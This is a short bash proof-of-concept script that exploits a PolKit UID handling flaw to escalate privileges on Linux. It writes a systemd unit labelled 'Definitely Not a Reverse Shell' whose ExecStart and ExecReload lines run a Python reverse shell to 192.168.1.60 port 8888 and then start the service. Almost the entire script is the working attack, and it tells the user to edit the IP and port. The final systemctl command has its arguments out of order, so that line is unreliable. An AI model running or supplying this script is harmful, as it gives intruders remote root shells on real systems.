#!/bin/bash
 
echo "Please note that you must have permissions to create users to escalate priveleges using this script."
echo '\n'
echo "Otherwise, if you do not, your UID must be > INT_MAX in PolKit (Which is rare.) This is merely a PoC."

 
#Create vulnerable service to be installed via SystemD
#Edit payload in ExecStart for custom IP and port
 
cat <<EOF >> /tmp/vulnerable.service
[Unit]
Description=Definitely Not a Reverse Shell
After=network.target
 
[Service]
ExecStart=/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.60",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
ExecReload=/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.60",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
Restart=on-failure
RuntimeDirectoryMode=0755
 
[Install]
WantedBy=multi-user.target
Alias=vulnerable.service
EOF
 
#Install vulnerable service to SystemD using created user
 
#systemctl enable /tmp/vulnerable.service
 
#Pop reverse shell
 
 systemctl vulnerable.service start 